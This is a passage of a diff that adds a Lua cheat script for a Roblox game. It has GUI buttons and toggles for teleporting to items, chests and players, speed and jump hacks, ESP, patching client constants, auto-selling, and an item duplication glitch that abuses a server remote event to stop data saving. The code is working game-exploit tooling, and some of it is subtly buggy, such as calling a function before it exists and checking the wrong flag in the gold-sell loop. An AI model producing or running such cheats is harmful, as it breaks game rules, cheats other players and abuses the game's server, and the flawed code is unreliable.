+                    table.insert(MiscPositionsTable, miscpos)
+                end
+            end
+        end
+        if MiscPositionsTable[1] == nil then
+            MakeAtlasNotification("No "..getgenv().MiscItems.. ' Gangy', 'There is no '..getgenv().MiscItems.. ' :(', 3)
+        else
+            if IsPlayerAlive(LocalPlayer) then
+                local myroot = LocalPlayer.Character.HumanoidRootPart
+                myroot.CFrame = CFrame.new(MiscPositionsTable[1] + Vector3.new(0, 5, 0))
+            end
+        end
+    end
+})
+
+MiscFindingSection:CreateDropdown({
+    Name = 'Item Type',
+    DefaultItemSelected = 'Watermelon Patch',
+    Options = {'Watermelon Patch', 'Potato Patch', 'Carrot Patch', 'Cabbage Patch', 'Small Oyster', 'Large Orange Shell', 'Large Pink Shell', 'Large White Shell', 'Small Orange Shell', 'Small Pink Shell', 'Small White Shell', 'Seaglass', 'Orange Slime', 'Green Slime', 'Blue Slime',},
+    ItemSelecting = true,
+    Callback = function(Value)
+       getgenv().MiscItems = Value 
+    end
+})
+
+local ChestSpawningSection = Chests:CreateSection('Chest Spawning')
+
+ChestSpawningSection:CreateButton({
+    Name = 'Spawn Easy Treaure Chest(100 tokens)',
+    Callback = function()
+        RemoteEvents['BuyWorldEvent']:FireServer(1)
+    end
+})
+
+ChestSpawningSection:CreateButton({
+    Name = 'Spawn Medium Treaure Chest(450 tokens)',
+    Callback = function()
+        RemoteEvents['BuyWorldEvent']:FireServer(2)
+    end
+})
+
+ChestSpawningSection:CreateButton({
+    Name = 'Spawn Hard Treaure Chest(1000 tokens)',
+    Callback = function()
+        RemoteEvents['BuyWorldEvent']:FireServer(3)
+    end
+})
+
+local ChestOpeningSection = Chests:CreateSection('Chest Opening')
+
+ChestOpeningSection:CreateButton({
+    Name = 'Open Easy Chest',
+    Callback = function()
+        RemoteEvents['InventoryInteraction']:FireServer(166, "Open")
+    end
+})
+
+ChestOpeningSection:CreateButton({
+    Name = 'Open Medium Chest',
+    Callback = function()
+        RemoteEvents['InventoryInteraction']:FireServer(167, "Open")
+    end
+})
+
+ChestOpeningSection:CreateButton({
+    Name = 'Open Hard Chest',
+    Callback = function()
+        RemoteEvents['InventoryInteraction']:FireServer(168, "Open")
+    end
+})
+
+local ChestFindingSection = Chests:CreateSection('Chest Finding')
+
+ChestFindingSection:CreateButton({
+    Name = 'Get Map Treaure',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            local function GetAllTreasure()
+                for _, chest in pairs(Workspace:GetDescendants()) do
+                    if string.find(chest.Name, 'Treasure Chest') then
+                        local chestpos = chest:GetPivot().Position
+                        repeat task.wait()
+                            if chest.Parent then
+                                myroot.CFrame = CFrame.new(chestpos + Vector3.new(0, 1, 0))
+                                RemoteEvents['ItemInteracted']:FireServer(chest, "Pickup")
+                            end
+                        until not chest.Parent
+                    end
+                end
+                myroot.CFrame = oldpos
+            end
+            if not GetAllTreasure() then
+                MakeAtlasNotification('No chests spawned in :(', 'Try spawning one in! or..... wait.', 3)
+            end
+        end
+    end
+})
+
+local ClueHelperSection = Chests:CreateSection('Clue Helper')
+
+ClueHelperSection:CreateButton({
+    Name = 'Clue is a text',
+    Callback = function()
+        local Steps = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('Clues'):WaitForChild('Steps'))
+        local currentclue = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('Riddle')
+        local loadout = currentclue.Parent.Loadout.Text
+        local cluetable = {};
+        local CLUETYPE = nil;
+        local loadoutsubbed = string.gsub(loadout, 'Must wear:  ', '')
+
+        local function TrackClue()
+            for _, riddle in pairs(Steps) do
+                if riddle.Riddle ~= nil then
+                    if currentclue.Text == riddle.Riddle then
+                        CLUETYPE = riddle.Name
+                    end
+                end
+            end
+            if CLUETYPE ~= nil then
+                for _, clue in pairs(Workspace:GetDescendants()) do
+                    if clue.Name == CLUETYPE then
+                        if clue:IsA('Model') then
+                            if clue.PrimaryPart ~= nil then
+                                table.insert(cluetable, clue.PrimaryPart.Position)
+                            end
+                        else
+                            table.insert(cluetable, clue.Position)
+                        end
+                    end
+                end
+            end
+            if cluetable[1] ~= nil then
+                if IsPlayerAlive(LocalPlayer) then
+                    LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(cluetable[1] + Vector3.new(0, 20, 0))
+                    return true
+                end
+            else
+                MakeAtlasNotification("Clue not found", 'Your clue is not on the map', 3)
+                return false
+            end
+        end
+        if TrackClueImage() then
+            MakeAtlasNotification('Must wear(if so):', loadoutsubbed, 7)
+        end
+    end
+})
+
+ClueHelperSection:CreateButton({
+    Name = 'Clue is an image',
+    Callback = function()
+        local Steps = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('Clues'):WaitForChild('Steps'))
+        local CurrentClueImage = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('ImageLabel').Image
+        local loadout = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('Loadout').Text
+        local IMAGES = {};
+        local CLUELOCATION = nil;
+        local loadoutsubbed = string.gsub(loadout, 'Must wear: ', '')
+        
+        function TrackClueImage()
+            local function CheckImage()
+                for _, image in pairs(Steps) do
+                    if image.Image then
+                        if CurrentClueImage == image.Image then
+                            CLUELOCATION = image.Location
+                            return true
+                        end
+                    end
+                end
+                return false
+            end
+            
+            if CheckImage() then
+                if IsPlayerAlive(LocalPlayer) then
+                    LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(CLUELOCATION + Vector3.new(0, 15, 0))
+                    if not LocalPlayer.Character:FindFirstChild('Shovel') then
+                        RemoteEvents['InventoryInteraction']:FireServer(169, 'Equip')
+                    end
+                    task.wait(0.4)
+                    RemoteEvents['ToolAction']:FireServer(CLUELOCATION)
+                    return true
+                end
+            else
+                return false
+            end
+        end
+        if TrackClueImage() then
+            MakeAtlasNotification('Must wear(if so):', loadoutsubbed, 7)
+        end
+    end
+})
+
+local BumpUpChestSection = Chests:CreateSection('')
+
+local PlayerModificationsSection = LPlayer:CreateSection('Player Modifications')
+
+PlayerModificationsSection:CreateToggle({
+    Name = 'Inf-Jump',
+    Default = false,
+    Flag = 'InfJump',
+    Callback = function(Value)
+        getgenv().configs.InfJump = Value
+        InfJump()
+	end
+})
+
+PlayerModificationsSection:CreateToggle({
+    Name = 'Anti-Ragdoll',
+    Default = false,
+    Flag = 'AntiRagDoll',
+    Callback = function(Value)
+        getgenv().configs.AntiRagDoll = Value
+        if getgenv().configs.AntiRagDoll then
+            if not getgenv().RagDollBypass then
+                getgenv().RagDollBypass = LocalPlayer.Character:WaitForChild('Humanoid').StateChanged:Connect(function(state)
+                    if not getgenv().configs.AntiRagDoll then
+                        getgenv().RagDollBypass:Disconnect()
+                        getgenv().RagDollBypass = nil
+                        return
+                    end
+                    if IsPlayerAlive(LocalPlayer) then
+                        if LocalPlayer.Character:WaitForChild('Humanoid'):GetState() == Enum.HumanoidStateType.Physics then
+                            LocalPlayer.Character.Humanoid:ChangeState(2)
+                        end
+                    end
+                end)
+            end
+        else
+            if getgenv().RagDollBypass then
+                getgenv().RagDollBypass:Disconnect()
+                getgenv().RagDollBypass = nil
+            end
+        end
+	end
+})
+
+PlayerModificationsSection:CreateKeybind({
+    Name = 'QuickSpeed',
+    Default = "B",
+    Flag = 'QuickSpeed',
+    Callback = function(key)
+        getgenv().QuickSpeedKey = key
+    end,
+    KeyPressed = function()
+        while UserInputService:IsKeyDown(getgenv().QuickSpeedKey) and not UserInputService:GetFocusedTextBox() do
+            task.wait()
+            if IsPlayerAlive(LocalPlayer) then
+                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
+                    LocalPlayer.Character:TranslateBy(LocalPlayer.Character.Humanoid.MoveDirection * (getgenv().QuickSpeedMultiplier*.50))
+                end
+            end
+        end
+    end
+})
+
+PlayerModificationsSection:CreateSlider({
+    Name = 'QuickSpeed multiplier',
+    Min = 1,
+	Max = 20,
+	Default = 1,
+	Digits = 0,
+    Flag = 'QuickSpeedMultiplier',
+	Callback = function(Value)
+		getgenv().QuickSpeedMultiplier = Value
+	end     
+})
+
+PlayerModificationsSection:CreateSlider({
+    Name = 'Swim Speed',
+    Min = 10,
+	Max = 100,
+	Default = 14,
+	Digits  = 0,
+    Flag = 'SwimSpeed',
+	Callback = function(Value)
+		local Constants = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('CONSTANTS'))
+		Constants.WALK_SPEEDS.SWIM = Value
+	end 
+})
+
+PlayerModificationsSection:CreateToggle({
+    Name = 'Jump Power',
+    Default = false,
+    Flag = 'JumpPower',
+    Callback = function(Value)
+       getgenv().configs.JumpPower = Value 
+       JumpPower()
+    end
+})
+
+PlayerModificationsSection:CreateToggle({
+    Name = 'Sneaky Speed',
+    Default = false,
+    Flag = 'SneakySpeed',
+    Callback = function(Value)
+        getgenv().configs.ExtraSpeed = Value 
+       ExtraSpeed()
+    end
+})
+
+local MiscModSections = LPlayer:CreateSection('Misc Mods')
+
+MiscModSections:CreateButton({
+    Name = 'Get Map Candy(Op)',
+    Callback = function()
+        function GetCandy()
+            for _, candy in pairs(Workspace:GetDescendants()) do
+                if candy.Name == 'Candy' then
+                    repeat task.wait()
+                        local CandyPos = candy:GetPivot().Position
+                        if IsPlayerAlive(LocalPlayer) then
+                            if candy.Parent then
+                                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(CandyPos + Vector3.new(0, 2, 0))
+                                RemoteEvents['ItemInteracted']:FireServer(candy, "Pickup")
+                            end
+                        end
+                    until not candy.Parent or not IsPlayerAlive(LocalPlayer)
+                end
+            end
+        end
+        GetCandy()
+        if not Workspace:FindFirstChild('Candy', true) then
+            MakeAtlasNotification('No Candies left/found', 'No candies left in the map', 3)
+        end
+    end
+})
+
+if MyInventory:FindFirstChild("Glider") or MyInventory:FindFirstChild("Easter Glider") then
+    MiscModSections:CreateSliderToggle({
+        Name = "Mod Glider Speed",
+        Min = 30,
+        Max = 300,
+        SliderDefault = 30,
+        Digits = 0,
+        ToggleDefault = false,
+        SliderFlag = "GliderModSpeed",
+        ToggleFlag = "GliderModSpeedToggle",
+        SliderCallback = function(Value) 
+            getgenv().GliderModSpeed = Value
+        end,
+        ToggleCallback = function(Value)
+            local GliderModule = require(LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Main'):WaitForChild('ToolController'):WaitForChild('ToolObject'):WaitForChild('Controllers'):WaitForChild('Glider'))
+            if Value == true then
+                setconstant(GliderModule.Step, 9, tonumber(getgenv().GliderModSpeed))
+            else
+                setconstant(GliderModule.Step, 9, 30)
+            end
+        end
+    })
+end
+
+MiscModSections:CreateButton({
+    Name = 'Restore Candy Mesh(not invisible)',
+    Callback = function()
+        local CheckPassiveOrNonPassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
+        for _, candy in pairs(Workspace:GetDescendants()) do
+            if candy.Name == 'Candy' and candy:FindFirstChildOfClass('MeshPart') then
+                candy.PrimaryPart.MeshId = 'rbxassetid://4018923852'
+            end
+        end
+        if not getgenv().CandyAdded then
+            getgenv().CandyAdded = Workspace:WaitForChild('Replicators')[CheckPassiveOrNonPassive].ChildAdded:Connect(function(candie)
+                task.wait(0.1)
+                if candie.Name == 'Pile of Candy' then
+                    for _, multicandy in pairs(candie:FindFirstChildOfClass('Model'):GetChildren()) do
+                        multicandy.MeshId = 'rbxassetid://4018923852'
+                    end
+                elseif candie.Name == 'Candy' and candie:FindFirstChildOfClass('MeshPart') then
+                    candie.PrimaryPart.MeshId = 'rbxassetid://4018923852'
+                end
+            end)
+            getgenv().CandyAdded2 = Workspace.ChildAdded:Connect(function(candie)
+                task.wait(0.1)
+                if candie.Name == 'Candy' and candie:FindFirstChildOfClass('MeshPart') then
+                    candie.PrimaryPart.MeshId = 'rbxassetid://4018923852'
+                end
+            end)
+        end
+        MakeAtlasNotification('Restored mesh', 'Candies should now be visible', 3)
+    end
+})
+
+MiscModSections:CreateButton({
+    Name = 'Drive in water',
+    Callback = function()
+        local Cart = require(LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Main'):WaitForChild('Vehicle'):WaitForChild('Cart'))
+        Cart.TerrainCheck = function()
+            return false 
+        end
+    end
+})
+
+MiscModSections:CreateTextBox({
+    Name = 'Player Tp',
+    DefaultText = '',
+    PlaceholderText = 'Username here',
+    ClearTextOnFocus = true,
+    Flag = 'PlayerTpTextbox',
+    Callback = function(Value)
+        if Value == "" then return end
+        for _, plr in pairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer then
+                if string.find(plr.Name:lower(), Value:lower()) or string.find(plr.DisplayName:lower(), Value:lower()) then
+                    if IsPlayerAlive(LocalPlayer) and IsPlayerAlive(plr) then
+                        local targetpos = plr.Character.HumanoidRootPart.Position
+                        local myroot = LocalPlayer.Character.HumanoidRootPart.Position
+                        myroot.CFrame = CFrame.new(targetpos)
+                        MakeAtlasNotification('Success', 'Tped to: '..plr.Name, 3)
+                    end
+                end
+            end
+        end
+    end
+})
+
+local RealDupeSection = Dupe:CreateSection('Real Duplication Glitch(data does not save)')
+
+RealDupeSection:CreateButton({
+    Name = 'Stop data(dupe)',
+    Callback = function(Value)
+        RemoteEvents['SetSettings']:FireServer(Workspace)
+		MakeAtlasNotification('Data Stopped', 'Drop anything you want :)', 5)
+    end
+})
+
+RealDupeSection:CreateButton({
+    Name = 'Rejoin Current Server',
+    Callback = function(Value)
+		MakeAtlasNotification('Rejoining', 'Rejoining the server', 1)
+        TeleportService:Teleport(game.PlaceId, LocalPlayer)
+    end
+})
+
+RealDupeSection:CreateTextBox({
+    Name = 'Loop Item Drop Name:',
+    DefaultText = '',
+    PlaceholderText = 'Inventory Item',
+    ClearTextOnFocus = true,
+    Flag = 'RepeatDropInventoryItem',
+    Callback = function(args)
+        if args == "" then return end
+        for _, item in pairs(MyInventory:GetChildren()) do
+            if string.find(item.Name:lower(), args:lower()) then
+                ItemIndexed = item
+                return MakeAtlasNotification('Item Selected:', item.Name, 3)
+            else
+                ItemIndexed = nil
+				ItemIndexedNumber = nil
+            end
+        end
+        return MakeAtlasNotification('Invalid Item', 'Item not found', 3)
+    end
+})
+
+RealDupeSection:CreateToggle({
+    Name = 'Loop Item Drop',
+    Default = false,
+    Flag = 'LoopDropItem',
+    Callback  = function(Value)
+        getgenv().configs.AmountToLoopDrop = Value
+        if getgenv().configs.AmountToLoopDrop == true then
+            if ItemIndexed and ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel') then
+                ItemIndexedNumber = ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+')
+                repeat task.wait()
+                    if IsPlayerAlive(LocalPlayer) then
+                        if ItemIndexed.Parent then
+                            if ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+') == nil then
+                                RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], 'Drop')
+                            else
+                                ItemIndexedNumber = ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+')
+                                RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], 'Drop')
+                            end
+                        end
+                    end
+                until not ItemIndexed.Parent or not getgenv().configs.AmountToLoopDrop or not IsPlayerAlive(LocalPlayer)
+            end
+        end
+    end
+})
+
+local AutoSellSection = AutoSell:CreateSection('AutoSell (This does not account for pet token multipliers)')
+
+AutoSellSection:CreateToggle({
+    Name = '4 Silver Bar = 1 Token',
+    Default = false,
+    Flag = 'SellSilverBar',
+    Callback = function(Value)
+        _G.SellSilver = Value
+        while _G.SellSilver and task.wait(0.5) do
+            if _G.SellSilver then
+                SellItem('Silver Bar', 4, 14)
+            end
+        end
+    end
+})
+
+AutoSellSection:CreateToggle({
+    Name = '4 Slime Ball = 1 Token',
+    Default = false,
+    Flag = 'SellSlimeBall',
+    Callback = function(Value)
+        _G.SellSlime = Value
+        while _G.SellSlime and task.wait(0.5) do
+            if _G.SellSlime then
+                SellItem('Slime Ball', 40, 15)
+            end
+        end
+    end
+})
+
+AutoSellSection:CreateToggle({
+    Name = '2 Gold Bar = 1 Token',
+    Default = false,
+    Flag = 'SellGoldBar',
+    Callback = function(Value)
+        _G.SellGold = Value
+        while _G.SellSlime and task.wait(0.5) do
+            if _G.SellSlime then
+                SellItem("Gold Bar", 2, 16)
+            end
+        end
+    end
+})
+
+AutoSellSection:CreateToggle({
+    Name = '1 Ruby = 3 Token',
+    Default = false,
+    Flag = 'SellRuby',
+    Callback = function(Value)
+        _G.SellRuby = Value
+        while _G.SellRuby and task.wait(0.5) do
+            if _G.SellRuby then
+                SellItem("Ruby", 1, 17)
+            end
+        end
+    end
+})
+
+AutoSellSection:CreateToggle({
+    Name = '1 Diamond = 4 Token',
+    Default = false,
+    Flag = 'SellDiamond',
+    Callback = function(Value)
+        _G.SellDiamonds = Value
+        while _G.SellDiamonds and task.wait(0.5) do
+            if _G.SellDiamonds then
+                SellItem("Diamond", 1, 18)
+            end
+        end
+    end
+})
+
+AutoSellSection:CreateToggle({
+    Name = '1 Soul = 5 Token',
+    Default = false,
+    Flag = 'SellSoul',
+    Callback = function(Value)
+        _G.SellSouls = Value
+        while _G.SellSouls and task.wait(0.5) do
+            if _G.SellSouls then
+                if getgenv().configs.UseSoulKeys then
+                    SellItem("Soul", 11, 22)
+                else
+                    SellItem("Soul", 1, 22)
+                end
+            end
+        end
+    end
+})
+
+AutoSellSection:CreateToggle({
+    Name = '1 Zenyte = 6 Token',
+    Default = false,
+    Flag = 'SellZenyte',
+    Callback = function(Value)
+        _G.SellZenyte = Value
+        while _G.SellZenyte and task.wait(0.5) do
+            if _G.SellZenyte then
+                SellItem("Zenyte", 1, 19)
+            end
+        end
+    end
+})
+
+AutoSellSection:CreateToggle({
+    Name = '1 Volcanic Ore = 15 Token',
+    Default = false,
+    Flag = 'SellVolcanicOre',
+    Callback = function(Value)
+        _G.SellVolcanicOre = Value
+        while _G.SellVolcanicOre and task.wait(0.5) do
+            if _G.SellVolcanicOre then
+                SellItem("Volcanic Ore", 1, 23)
+            end
+        end
+    end
+})
+
+AutoSellSection:CreateToggle({
+    Name = '1 Obsidian = 20 Token',
+    Default = false,
+    Flag = 'SellObsidian',
+    Callback = function(Value)
+        _G.SellObsidian = Value
+        while _G.SellObsidian and task.wait(0.5) do
+            if _G.SellObsidian then
+                SellItem("Obsidian", 1, 24)
+            end
+        end
+    end
+})
+
+AutoSellSection:CreateToggle({
+    Name = '1 Lunar Ore = 25 Token',
+    Default = false,
+    Flag = 'SellLunar',
+    Callback = function(Value)
+        _G.SellLunarOre = Value
+        while _G.SellLunarOre and task.wait(0.5) do
+            if _G.SellLunarOre then
+                SellItem("Lunar Ore", 1, 25)
+            end
+        end
+    end
+})
+
+AutoSellSection:CreateToggle({
+    Name = '1 Moonstone = 30 Token',
+    Default = false,
+    Flag = 'SellMoonstone',
+    Callback = function(Value)
+        _G.SellMoonstone = Value
+        while _G.SellMoonstone and task.wait(0.5) do
+            if _G.SellMoonstone then
+                SellItem("Moonstone", 1, 26)
+            end
+        end
+    end
+})
+
+local ArmorTraderSection = AutoSell:CreateSection('Armor Trader')
+
+ArmorTraderSection:CreateButton({
+    Name = 'Ruby Shield = 50 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 27)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Diamond Shield = 100 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 28)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Zenyte Shield = 150 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 29)
+    end
+})
+
+
+ArmorTraderSection:CreateButton({
+    Name = 'Obsidian Shield = 350 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 30)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Ruby Helmet = 15 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 31)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Ruby Body = 15 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 32)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Ruby Legs = 15 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 33)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Ruby Boots = 15 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 34)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Diamond Helmet = 27 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 35)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Diamond Body = 27 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 36)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Diamond Legs = 27 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 37)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Diamond Boots = 27 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 38)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Zenyte Helmet = 45 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 39)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Zenyte Body = 45 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 40)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Zenyte Legs = 45 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 41)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Zenyte Boots = 45 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 42)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Obsidian Helmet = 115 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 43)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Obsidian Body = 115 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 44)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Obsidian Legs = 115 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 45)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Obsidian Boots = 115 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 46)
+    end
+})
+
+
+ArmorTraderSection:CreateButton({
+    Name = 'Moostone Helmet = 175 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 47)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Moostone Body = 175 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 48)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Moostone Legs = 175 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 49)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Moostone Boots = 175 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 50)
+    end
+})
+
+ArmorTraderSection:CreateButton({
+    Name = 'Springy Boots',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 51)
+    end
+})
+
+local WeaponTraderSection = AutoSell:CreateSection('Weapon Trader')
+
+WeaponTraderSection:CreateButton({
+    Name = 'Silver Sword = 1 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 11)
+    end
+})
+
+WeaponTraderSection:CreateButton({
+    Name = 'Gold Sword = 2 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 12)
+    end
+})
+
+WeaponTraderSection:CreateButton({
+    Name = 'Gold Bow = 3 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 13)
+    end
+})
+
+WeaponTraderSection:CreateButton({
+    Name = 'Ruby Sword = 10 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 14)
+    end
+})
+
+WeaponTraderSection:CreateButton({
+    Name = 'Diamond Sword = 18 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 15)
+    end
+})
+
+WeaponTraderSection:CreateButton({
+    Name = 'Zenyte Sword = 30 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 17)
+    end
+})
+
+WeaponTraderSection:CreateButton({
+    Name = 'Diamond Crossbow = 36 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 16)
+    end
+})
+
+WeaponTraderSection:CreateButton({
+    Name = 'Zenyte Crossbow = 45 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 18)
+    end
+})
+
+WeaponTraderSection:CreateButton({
+    Name = 'Obsidian Club = 80 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 19)
+    end
+})
+
+WeaponTraderSection:CreateButton({
+    Name = 'Moonstone Sword = 130 Token',
+    Callback = function()
+        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 20)
+    end
+})
+
+local EspSection = Visuals:CreateSection('Esp')
+
+EspSection:CreateToggle({
+    Name = "Esp",
+    Default = false,
+    Flag = 'PlayerEsp',
+    Callback = function(Value)
+        getgenv().configs.PlayerEsp = Value
+        PlayerEsp()
+    end
+})
+
+local VisualsSection = Visuals:CreateSection('Visuals')
+
+VisualsSection:CreateSliderToggle({
+	Name = "Time Of Day",
+	Min = 0.1,
+	Max = 24,
+    Digits = 1,
+	SliderDefault = Lighting.ClockTime,
+    ToggleDefault = false,
+    SliderFlag = 'TimeOfDay',
+    ToggleFlag = 'ToggleTimeOfDay',
+    SliderCallback = function(Value)
+        _G.ClockTime = Value
+    end,
+	ToggleCallback = function(Value)
+        if _G.ClockTime then
+            Lighting.ClockTime = _G.ClockTime
+            _G.ClockTimeChanged = Value
+            if not ClockTimeChanged and _G.ClockTimeChanged then
+                ClockTimeChanged = Lighting.Changed:Connect(function(clock)
+                    if not _G.ClockTimeChanged then
+                        ClockTimeChanged:Disconnect()
+                        ClockTimeChanged = nil
+                    end
+                    if clock == 'ClockTime' then
+                        Lighting.ClockTime = _G.ClockTime
+                    end
+                end)
+            else
+                if ClockTimeChanged then
+                    ClockTimeChanged:Disconnect()
+                    ClockTimeChanged = nil
+                end
+            end
+        end
+	end    
+})
+
+VisualsSection:CreateSliderToggle({
+	Name = "Brightness",
+	Min = 0.1,
+	Max = 15,
+    Digits = 1,
+	SliderDefault = Lighting.Brightness,
+    ToggleDefault = false,
+    SliderFlag = 'Brightness',
+    ToggleFlag = 'ToggleBrightness',
+    SliderCallback = function(Value)
+        _G.Brightness = Value
+    end,
+	ToggleCallback = function(Value)
+        if _G.Brightness then
+            Lighting.Brightness = _G.Brightness
+            _G.BrightnessChanged = Value
+            if not BrightnessChanged and _G.BrightnessChanged then
+                BrightnessChanged = Lighting.Changed:Connect(function(clock)
+                    if not _G.BrightnessChanged then
+                        BrightnessChanged:Disconnect()
+                        BrightnessChanged = nil
+                    end
+                    if clock == 'Brightness' then
+                        Lighting.Brightness = _G.Brightness
+                    end
+                end)
+            else
+                if BrightnessChanged then
+                    BrightnessChanged:Disconnect()
+                    BrightnessChanged = nil
+                end
+            end
+        end
+	end    
+})
+
+VisualsSection:CreateSliderToggle({
+	Name = "Saturation",
+	Min = 0.1,
+	Max = 3,
+    Digits = 1,
+	SliderDefault = Lighting:WaitForChild('ColorCorrection').Saturation,
+    ToggleDefault = false,
+    SliderFlag = 'Saturation',
+    ToggleFlag = 'ToggleSaturation',
+    SliderCallback = function(Value)
+        _G.Saturation = Value
+    end,
+	ToggleCallback = function(Value)
+        if _G.Saturation then
+            Lighting:WaitForChild('ColorCorrection').Saturation = _G.Saturation
+        end
+	end    
+})
+
+VisualsSection:CreateSliderToggle({
+	Name = "Contrast",
+	Min = 0.1,
+	Max = 3,
+    Digits = 1,
+	SliderDefault = Lighting:WaitForChild('ColorCorrection').Contrast,
+    ToggleDefault = false,
+    SliderFlag = 'Contrast',
+    ToggleFlag = 'ToggleContrast',
+    SliderCallback = function(Value)
+        _G.Contrast = Value
+    end,
+	ToggleCallback = function(Value)
+        if _G.Contrast then
+            Lighting:WaitForChild('ColorCorrection').Contrast = _G.Contrast
+        end
+	end    
+})
+
+VisualsSection:CreateSliderToggle({
+	Name = "Fog End",
+	Min = 0.1,
+	Max = 15,
+    Digits = 1,
+	SliderDefault = Lighting:WaitForChild('Atmosphere').Density,
+    ToggleDefault = false,
+    SliderFlag = 'FogEnd',
+    ToggleFlag = 'ToggleFogEnd',
+    SliderCallback = function(Value)
+        _G.FogEnd = Value
+    end,
+	ToggleCallback = function(Value)
+        if _G.FogEnd then
